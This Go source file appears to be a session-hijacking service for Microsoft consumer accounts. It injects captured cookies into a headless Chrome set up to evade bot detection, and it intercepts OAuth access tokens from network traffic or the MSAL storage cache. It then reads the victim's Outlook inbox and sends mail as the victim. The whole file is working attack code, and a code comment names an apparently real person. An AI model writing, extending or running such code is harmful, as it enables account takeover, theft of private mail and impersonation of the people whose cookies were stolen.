package service

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"go.uber.org/zap"
)

// BrowserSessionService handles browser-based cookie validation and token acquisition.
// It injects captured cookies into a headless Chrome instance, navigates to Microsoft
// login to establish an SSO session, then intercepts the OAuth access token that
// MSAL.js acquires during the Outlook page load.
//
// This approach works for MSA consumer accounts (e.g., @outlook.com, @hotmail.com,
// @gmail.com linked to Microsoft) where the MSRT refresh token cannot be exchanged
// via standard OAuth2 token endpoints.
type BrowserSessionService struct {
	Logger *zap.SugaredLogger
	mu     sync.Mutex
}

// NewBrowserSessionService creates a new BrowserSessionService
func NewBrowserSessionService(logger *zap.SugaredLogger) *BrowserSessionService {
	return &BrowserSessionService{
		Logger: logger,
	}
}

// BrowserSessionResult holds the result of a browser-based session validation
type BrowserSessionResult struct {
	Valid       bool   `json:"valid"`
	Email       string `json:"email"`
	DisplayName string `json:"displayName"`
	AccessToken string `json:"accessToken"`
	Error       string `json:"error,omitempty"`
}

// cookieEntry represents a single cookie from the stored JSON
type cookieEntry struct {
	Name           string      `json:"name"`
	Value          string      `json:"value"`
	Domain         string      `json:"domain"`
	Path           string      `json:"path"`
	Secure         interface{} `json:"secure"`
	HttpOnly       interface{} `json:"httpOnly"`
	SameSite       string      `json:"sameSite"`
	ExpirationDate interface{} `json:"expirationDate"`
}

// ValidateAndGetToken uses headless Chrome to validate cookies and obtain an access token.
// Flow:
//  1. Launch headless Chrome
//  2. Inject all captured cookies
//  3. Navigate to login.live.com to establish SSO session
//  4. Navigate to outlook.live.com/mail/ to trigger MSAL.js token acquisition
//  5. Intercept the access token from network requests
//  6. Extract email/display name from the page or token response
func (b *BrowserSessionService) ValidateAndGetToken(ctx context.Context, cookiesJSON string) (*BrowserSessionResult, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("starting browser-based cookie validation")

	// Parse cookies
	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	if len(cookies) == 0 {
		return &BrowserSessionResult{Valid: false, Error: "no cookies to inject"}, nil
	}

	// Launch headless Chrome
	chromePath := os.Getenv("CHROME_PATH")
	if chromePath == "" {
		chromePath = "/usr/bin/chromium"
	}

	l := launcher.New().
		Bin(chromePath).
		Headless(true).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-infobars", "").
		Set("no-first-run", "").
		Set("no-default-browser-check", "").
		Set("disable-gpu", "").
		Set("window-size", "1920,1080")

	// Run as root requires no-sandbox
	if os.Geteuid() == 0 {
		l = l.NoSandbox(true)
	}

	wsURL, err := l.Launch()
	if err != nil {
		return nil, fmt.Errorf("failed to launch Chrome: %w", err)
	}

	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		return nil, fmt.Errorf("failed to connect to Chrome: %w", err)
	}
	defer browser.Close()

	// Set a global timeout
	timeoutCtx, cancel := context.WithTimeout(ctx, 90*time.Second)
	defer cancel()
	browser = browser.Context(timeoutCtx)

	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return nil, fmt.Errorf("failed to create page: %w", err)
	}

	// Inject cookies for all relevant Microsoft domains
	b.Logger.Infow("injecting cookies", "count", len(cookies))
	if err := b.injectCookies(page, cookies); err != nil {
		b.Logger.Warnw("some cookies failed to inject", "error", err)
	}

	// Set up network interception to capture access tokens
	var capturedToken string
	var capturedEmail string
	var capturedDisplayName string
	var tokenMu sync.Mutex

	// Enable network events first so we can intercept token responses
	err = proto.NetworkEnable{}.Call(page)
	if err != nil {
		b.Logger.Warnw("failed to enable network events", "error", err)
	}

	// Listen for network responses that contain access tokens
	waitEvents := page.EachEvent(func(e *proto.NetworkResponseReceived) {
		reqURL := e.Response.URL

		// Look for token responses from Microsoft auth endpoints
		isTokenEndpoint := strings.Contains(reqURL, "/oauth2/v2.0/token") ||
			strings.Contains(reqURL, "/consumers/oauth2/v2.0/token") ||
			(strings.Contains(reqURL, "login.microsoftonline.com") && strings.Contains(reqURL, "token"))

		if isTokenEndpoint {
			b.Logger.Debugw("intercepted token endpoint response", "url", reqURL, "status", e.Response.Status)

			// Get the response body
			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
			if bodyErr != nil {
				b.Logger.Debugw("failed to get token response body", "error", bodyErr)
				return
			}

			var tokenResp struct {
				AccessToken string `json:"access_token"`
				ExpiresIn   int    `json:"expires_in"`
				Scope       string `json:"scope"`
				IDToken     string `json:"id_token"`
			}
			if json.Unmarshal([]byte(body.Body), &tokenResp) == nil && tokenResp.AccessToken != "" {
				tokenMu.Lock()
				// Prefer tokens with Mail.Read or Mail.Send scope
				if capturedToken == "" ||
					strings.Contains(tokenResp.Scope, "Mail") ||
					strings.Contains(tokenResp.Scope, "mail") {
					capturedToken = tokenResp.AccessToken
					b.Logger.Infow("captured access token from browser",
						"scope", tokenResp.Scope,
						"expiresIn", tokenResp.ExpiresIn,
					)
				}
				tokenMu.Unlock()
			}
		}

		// Also look for Graph API /me responses to get email
		if strings.Contains(reqURL, "graph.microsoft.com") && strings.Contains(reqURL, "/me") {
			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
			if bodyErr == nil {
				var profile struct {
					Mail        string `json:"mail"`
					DisplayName string `json:"displayName"`
					UPN         string `json:"userPrincipalName"`
				}
				if json.Unmarshal([]byte(body.Body), &profile) == nil {
					tokenMu.Lock()
					if profile.Mail != "" {
						capturedEmail = profile.Mail
					} else if profile.UPN != "" {
						capturedEmail = profile.UPN
					}
					if profile.DisplayName != "" {
						capturedDisplayName = profile.DisplayName
					}
					tokenMu.Unlock()
				}
			}
		}
	})
	_ = waitEvents // will be called by the event loop automatically

	// Step 1: Navigate to login.live.com to establish SSO session
	b.Logger.Infow("navigating to login.live.com to establish SSO session")
	if err := page.Navigate("https://login.live.com/"); err != nil {
		return nil, fmt.Errorf("failed to navigate to login.live.com: %w", err)
	}

	// Wait for the page to settle (SSO redirect chain)
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("login.live.com load timeout, continuing", "error", err)
	}
	time.Sleep(3 * time.Second)

	// Check if we landed on account.microsoft.com (SSO success) or login page (SSO failed)
	currentURL := page.MustInfo().URL
	b.Logger.Infow("after login.live.com navigation", "currentURL", currentURL)

	if strings.Contains(currentURL, "login.live.com") && !strings.Contains(currentURL, "account.microsoft.com") {
		// Check if it's a login form (cookies didn't establish SSO)
		// Try to extract email from the page if visible
		hasLoginForm := false
		el, err := page.Element("#i0116") // email input field
		if err == nil && el != nil {
			hasLoginForm = true
		}
		if hasLoginForm {
			b.Logger.Warnw("SSO session not established - cookies may be expired")
			return &BrowserSessionResult{
				Valid: false,
				Error: "cookies did not establish SSO session - session may be expired",
			}, nil
		}
	}

	// Step 2: Navigate to Outlook to trigger MSAL.js token acquisition
	b.Logger.Infow("navigating to outlook.live.com/mail/ to trigger token acquisition")
	if err := page.Navigate("https://outlook.live.com/mail/"); err != nil {
		return nil, fmt.Errorf("failed to navigate to outlook.live.com: %w", err)
	}

	// Wait for Outlook to fully load and MSAL.js to acquire tokens
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("outlook.live.com load timeout, continuing", "error", err)
	}

	// Wait additional time for MSAL.js token acquisition (happens asynchronously)
	b.Logger.Infow("waiting for MSAL.js token acquisition...")
	for i := 0; i < 15; i++ {
		time.Sleep(2 * time.Second)
		tokenMu.Lock()
		hasToken := capturedToken != ""
		tokenMu.Unlock()
		if hasToken {
			b.Logger.Infow("token captured successfully")
			break
		}
	}

	// Check final page state
	finalURL := page.MustInfo().URL
	pageTitle, _ := page.Eval(`() => document.title`)
	title := ""
	if pageTitle != nil {
		title = pageTitle.Value.String()
	}

	b.Logger.Infow("final page state", "url", finalURL, "title", title)

	// If we didn't capture a token from network, try to extract from page JS
	tokenMu.Lock()
	if capturedToken == "" {
		b.Logger.Infow("no token from network interception, trying page JS extraction")
		token, email, displayName := b.extractFromPageJS(page)
		if token != "" {
			capturedToken = token
		}
		if email != "" && capturedEmail == "" {
			capturedEmail = email
		}
		if displayName != "" && capturedDisplayName == "" {
			capturedDisplayName = displayName
		}
	}
	tokenMu.Unlock()

	// Try to extract email from page title if not found
	if capturedEmail == "" && strings.Contains(title, " - ") {
		// Title format: "Mail - Jenessa Crook - Outlook"
		parts := strings.Split(title, " - ")
		if len(parts) >= 2 {
			capturedDisplayName = strings.TrimSpace(parts[1])
		}
	}

	// If we still don't have an email, try extracting from the page DOM
	if capturedEmail == "" {
		email := b.extractEmailFromDOM(page)
		if email != "" {
			capturedEmail = email
		}
	}

	tokenMu.Lock()
	result := &BrowserSessionResult{
		Valid:       capturedToken != "" || strings.Contains(title, "Outlook"),
		Email:       capturedEmail,
		DisplayName: capturedDisplayName,
		AccessToken: capturedToken,
	}
	tokenMu.Unlock()

	if !result.Valid {
		result.Error = fmt.Sprintf("could not establish Outlook session (landed on: %s)", finalURL)
	}

	b.Logger.Infow("browser session validation complete",
		"valid", result.Valid,
		"email", result.Email,
		"displayName", result.DisplayName,
		"hasToken", result.AccessToken != "",
	)

	return result, nil
}

// injectCookies injects cookies into the browser page for all relevant Microsoft domains
func (b *BrowserSessionService) injectCookies(page *rod.Page, cookies []cookieEntry) error {
	var lastErr error
	injected := 0

	for _, c := range cookies {
		if c.Name == "" || c.Value == "" {
			continue
		}

		domain := c.Domain
		if domain == "" {
			continue
		}

		// Normalize domain
		if strings.HasPrefix(domain, ".") {
			domain = domain[1:]
		}

		path := c.Path
		if path == "" {
			path = "/"
		}

		// Determine secure flag
		secure := false
		switch v := c.Secure.(type) {
		case bool:
			secure = v
		case string:
			secure = v == "true" || v == "1"
		case float64:
			secure = v != 0
		}

		// Determine httpOnly flag
		httpOnly := false
		switch v := c.HttpOnly.(type) {
		case bool:
			httpOnly = v
		case string:
			httpOnly = v == "true" || v == "1"
		case float64:
			httpOnly = v != 0
		}

		// Determine expiration
		var expires proto.TimeSinceEpoch
		switch v := c.ExpirationDate.(type) {
		case float64:
			if v > 0 {
				expires = proto.TimeSinceEpoch(v)
			}
		case string:
			// Skip if empty
		}

		// Determine sameSite
		sameSite := proto.NetworkCookieSameSiteNone
		switch strings.ToLower(c.SameSite) {
		case "strict":
			sameSite = proto.NetworkCookieSameSiteStrict
		case "lax":
			sameSite = proto.NetworkCookieSameSiteLax
		case "none", "no_restriction":
			sameSite = proto.NetworkCookieSameSiteNone
		}

		// Build the URL for the cookie
		scheme := "https"
		if !secure {
			scheme = "http"
		}
		cookieURL := fmt.Sprintf("%s://%s%s", scheme, domain, path)

		_, setErr := proto.NetworkSetCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain, // Use original domain (with leading dot if present)
			Path:     path,
			Secure:   secure,
			HTTPOnly: httpOnly,
			SameSite: sameSite,
			URL:      cookieURL,
			Expires:  expires,
		}.Call(page)

		if setErr != nil {
			lastErr = setErr
			b.Logger.Debugw("failed to inject cookie", "name", c.Name, "domain", c.Domain, "error", setErr)
		} else {
			injected++
		}
	}

	b.Logger.Infow("cookies injected", "injected", injected, "total", len(cookies))
	return lastErr
}

// extractFromPageJS tries to extract the access token from MSAL.js cache in the page
func (b *BrowserSessionService) extractFromPageJS(page *rod.Page) (token, email, displayName string) {
	// Try to get token from MSAL cache in sessionStorage/localStorage
	scripts := []string{
		// Try sessionStorage first (MSAL v2 default)
		`() => {
			try {
				for (let i = 0; i < sessionStorage.length; i++) {
					const key = sessionStorage.key(i);
					if (key && key.includes('accesstoken')) {
						const val = JSON.parse(sessionStorage.getItem(key));
						if (val && val.secret) {
							return JSON.stringify({token: val.secret, scope: val.target || ''});
						}
					}
				}
			} catch(e) {}
			return '';
		}`,
		// Try localStorage
		`() => {
			try {
				for (let i = 0; i < localStorage.length; i++) {
					const key = localStorage.key(i);
					if (key && key.includes('accesstoken')) {
						const val = JSON.parse(localStorage.getItem(key));
						if (val && val.secret) {
							return JSON.stringify({token: val.secret, scope: val.target || ''});
						}
					}
				}
			} catch(e) {}
			return '';
		}`,
	}

	for _, script := range scripts {
		result, err := page.Eval(script)
		if err != nil || result == nil {
			continue
		}
		val := result.Value.String()
		if val == "" {
			continue
		}

		var tokenData struct {
			Token string `json:"token"`
			Scope string `json:"scope"`
		}
		if json.Unmarshal([]byte(val), &tokenData) == nil && tokenData.Token != "" {
			token = tokenData.Token
			b.Logger.Infow("extracted token from MSAL cache", "scope", tokenData.Scope)
			break
		}
	}

	// Try to get account info from MSAL cache
	accountScripts := []string{
		`() => {
			try {
				for (let i = 0; i < sessionStorage.length; i++) {
					const key = sessionStorage.key(i);
					if (key && (key.includes('account') || key.includes('idtoken'))) {
						const val = JSON.parse(sessionStorage.getItem(key));
						if (val) {
							return JSON.stringify({
								email: val.username || val.preferred_username || '',
								name: val.name || '',
							});
						}
					}
				}
			} catch(e) {}
			return '';
		}`,
		`() => {
			try {
				for (let i = 0; i < localStorage.length; i++) {
					const key = localStorage.key(i);
					if (key && (key.includes('account') || key.includes('idtoken'))) {
						const val = JSON.parse(localStorage.getItem(key));
						if (val) {
							return JSON.stringify({
								email: val.username || val.preferred_username || '',
								name: val.name || '',
							});
						}
					}
				}
			} catch(e) {}
			return '';
		}`,
	}

	for _, script := range accountScripts {
		result, err := page.Eval(script)
		if err != nil || result == nil {
			continue
		}
		val := result.Value.String()
		if val == "" {
			continue
		}

		var accountData struct {
			Email string `json:"email"`
			Name  string `json:"name"`
		}
		if json.Unmarshal([]byte(val), &accountData) == nil {
			if accountData.Email != "" {
				email = accountData.Email
			}
			if accountData.Name != "" {
				displayName = accountData.Name
			}
			if email != "" || displayName != "" {
				break
			}
		}
	}

	return token, email, displayName
}

// extractEmailFromDOM tries to extract the email from the Outlook page DOM
func (b *BrowserSessionService) extractEmailFromDOM(page *rod.Page) string {
	// Try common selectors for the user email in Outlook
	selectors := []string{
		`[data-testid="mectrl_currentAccount_secondary"]`, // Account manager email
		`#mectrl_currentAccount_secondary`,
		`#O365_MainLink_Me`,
		`._3Cnqb`, // Outlook profile area
	}

	for _, sel := range selectors {
		el, err := page.Element(sel)
		if err != nil || el == nil {
			continue
		}
		text, err := el.Text()
		if err != nil || text == "" {
			continue
		}
		text = strings.TrimSpace(text)
		if strings.Contains(text, "@") {
			return text
		}
	}

	// Try JavaScript extraction
	result, err := page.Eval(`() => {
		try {
			// Try to find email in the page
			const meBtn = document.querySelector('[data-testid="mectrl_currentAccount_secondary"]');
			if (meBtn) return meBtn.textContent.trim();
			
			// Try aria labels
			const allBtns = document.querySelectorAll('button[aria-label]');
			for (const btn of allBtns) {
				const label = btn.getAttribute('aria-label');
				if (label && label.includes('@')) {
					const match = label.match(/[\w.-]+@[\w.-]+/);
					if (match) return match[0];
				}
			}
		} catch(e) {}
		return '';
	}`)
	if err == nil && result != nil {
		val := result.Value.String()
		if val != "" && strings.Contains(val, "@") {
			return val
		}
	}

	return ""
}

// SendEmailViaBrowser sends an email using browser automation on Outlook web
// This is the fallback when API-based sending fails
func (b *BrowserSessionService) SendEmailViaBrowser(ctx context.Context, cookiesJSON string, to []string, subject, body string, isHTML bool) error {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("sending email via browser automation", "to", to, "subject", subject)

	// Parse cookies
	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	// Launch headless Chrome
	chromePath := os.Getenv("CHROME_PATH")
	if chromePath == "" {
		chromePath = "/usr/bin/chromium"
	}

	l := launcher.New().
		Bin(chromePath).
		Headless(true).
		Set("disable-blink-features", "AutomationControlled").
		Set("no-first-run", "").
		Set("no-default-browser-check", "").
		Set("disable-gpu", "")

	if os.Geteuid() == 0 {
		l = l.NoSandbox(true)
	}

	wsURL, err := l.Launch()
	if err != nil {
		return fmt.Errorf("failed to launch Chrome: %w", err)
	}

	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		return fmt.Errorf("failed to connect to Chrome: %w", err)
	}
	defer browser.Close()

	timeoutCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
	defer cancel()
	browser = browser.Context(timeoutCtx)

	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return fmt.Errorf("failed to create page: %w", err)
	}

	// Inject cookies
	if err := b.injectCookies(page, cookies); err != nil {
		b.Logger.Warnw("some cookies failed to inject", "error", err)
	}

	// Navigate to login.live.com first for SSO
	if err := page.Navigate("https://login.live.com/"); err != nil {
		return fmt.Errorf("failed to navigate to login.live.com: %w", err)
	}
	page.WaitLoad()
	time.Sleep(3 * time.Second)

	// Navigate to Outlook new mail
	composeURL := "https://outlook.live.com/mail/0/deeplink/compose"
	if err := page.Navigate(composeURL); err != nil {
		return fmt.Errorf("failed to navigate to compose: %w", err)
	}
	page.WaitLoad()
	time.Sleep(5 * time.Second)

	// Fill in the To field
	toField, err := page.Element(`[aria-label="To"]`)
	if err != nil {
		// Try alternative selector
		toField, err = page.Element(`input[aria-label="To"]`)
		if err != nil {
			return fmt.Errorf("could not find To field: %w", err)
		}
	}
	for _, recipient := range to {
		toField.Input(recipient)
		toField.Type(input.Enter)
		time.Sleep(500 * time.Millisecond)
	}

	// Fill in Subject
	subjectField, err := page.Element(`[aria-label="Add a subject"]`)
	if err != nil {
		subjectField, err = page.Element(`input[aria-label="Subject"]`)
		if err != nil {
			return fmt.Errorf("could not find Subject field: %w", err)
		}
	}
	subjectField.Input(subject)

	// Fill in Body
	bodyField, err := page.Element(`[aria-label="Message body, press Alt+F10 to exit"]`)
	if err != nil {
		bodyField, err = page.Element(`div[role="textbox"]`)
		if err != nil {
			return fmt.Errorf("could not find body field: %w", err)
		}
	}

	if isHTML {
		// For HTML content, use JavaScript to set innerHTML
		page.Eval(fmt.Sprintf(`(selector) => {
			const el = document.querySelector('[aria-label="Message body, press Alt+F10 to exit"]') || document.querySelector('div[role="textbox"]');
			if (el) el.innerHTML = %s;
		}`, jsonEscape(body)))
	} else {
		bodyField.Input(body)
	}

	time.Sleep(1 * time.Second)

	// Click Send button
	sendBtn, err := page.Element(`[aria-label="Send"]`)
	if err != nil {
		sendBtn, err = page.Element(`button[title="Send"]`)
		if err != nil {
			return fmt.Errorf("could not find Send button: %w", err)
		}
	}
	sendBtn.Click(proto.InputMouseButtonLeft, 1)

	// Wait for send to complete
	time.Sleep(3 * time.Second)

	b.Logger.Infow("email sent via browser automation", "to", to, "subject", subject)
	return nil
}

// ReadInboxViaBrowser reads inbox messages using browser automation
// Returns a list of basic message info extracted from the Outlook web UI
func (b *BrowserSessionService) ReadInboxViaBrowser(ctx context.Context, cookiesJSON string) ([]map[string]string, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("reading inbox via browser automation")

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	chromePath := os.Getenv("CHROME_PATH")
	if chromePath == "" {
		chromePath = "/usr/bin/chromium"
	}

	l := launcher.New().
		Bin(chromePath).
		Headless(true).
		Set("disable-blink-features", "AutomationControlled").
		Set("no-first-run", "").
		Set("no-default-browser-check", "").
		Set("disable-gpu", "")

	if os.Geteuid() == 0 {
		l = l.NoSandbox(true)
	}

	wsURL, err := l.Launch()
	if err != nil {
		return nil, fmt.Errorf("failed to launch Chrome: %w", err)
	}

	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		return nil, fmt.Errorf("failed to connect to Chrome: %w", err)
	}
	defer browser.Close()

	timeoutCtx, cancel := context.WithTimeout(ctx, 90*time.Second)
	defer cancel()
	browser = browser.Context(timeoutCtx)

	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return nil, fmt.Errorf("failed to create page: %w", err)
	}

	// Inject cookies and establish SSO
	b.injectCookies(page, cookies)
	page.Navigate("https://login.live.com/")
	page.WaitLoad()
	time.Sleep(3 * time.Second)

	// Navigate to inbox
	page.Navigate("https://outlook.live.com/mail/")
	page.WaitLoad()
	time.Sleep(5 * time.Second)

	// Extract messages from the page
	result, err := page.Eval(`() => {
		try {
			const messages = [];
			// Try to find message list items
			const items = document.querySelectorAll('[data-convid], [role="option"], [aria-label*="message"]');
			items.forEach(item => {
				const sender = item.querySelector('[data-testid="SenderName"]')?.textContent || 
				               item.querySelector('.OZZZK')?.textContent || '';
				const subject = item.querySelector('[data-testid="SubjectLine"]')?.textContent ||
				                item.querySelector('.jGG6V')?.textContent || '';
				const preview = item.querySelector('[data-testid="BodyPreview"]')?.textContent ||
				                item.querySelector('.Mc1Ri')?.textContent || '';
				const date = item.querySelector('[data-testid="DateLine"]')?.textContent ||
				             item.querySelector('.jHATS')?.textContent || '';
				if (sender || subject) {
					messages.push({sender, subject, preview, date});
				}
			});
			return JSON.stringify(messages);
		} catch(e) {
			return '[]';
		}
	}`)

	if err != nil {
		return nil, fmt.Errorf("failed to extract messages: %w", err)
	}

	var messages []map[string]string
	if result != nil {
		json.Unmarshal([]byte(result.Value.String()), &messages)
	}

	return messages, nil
}

// jsonEscape escapes a string for use in JavaScript
func jsonEscape(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// ParseCookiesForDomains returns cookies filtered by Microsoft/Outlook domains
func ParseCookiesForDomains(cookiesJSON string) ([]cookieEntry, error) {
	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, err
	}

	msftDomains := []string{
		"live.com", "microsoft.com", "microsoftonline.com",
		"office.com", "office365.com", "outlook.com",
		"login.live.com", "outlook.live.com",
	}

	var filtered []cookieEntry
	for _, c := range cookies {
		domain := strings.TrimPrefix(c.Domain, ".")
		for _, d := range msftDomains {
			if strings.HasSuffix(domain, d) {
				filtered = append(filtered, c)
				break
			}
		}
	}

	return filtered, nil
}

// IsOutlookDomain checks if a URL belongs to an Outlook/Microsoft domain
func IsOutlookDomain(rawURL string) bool {
	u, err := url.Parse(rawURL)
	if err != nil {
		return false
	}
	host := strings.ToLower(u.Hostname())
	domains := []string{
		"live.com", "microsoft.com", "microsoftonline.com",
		"office.com", "office365.com", "outlook.com",
	}
	for _, d := range domains {
		if strings.HasSuffix(host, d) {
			return true
		}
	}
	return false
}
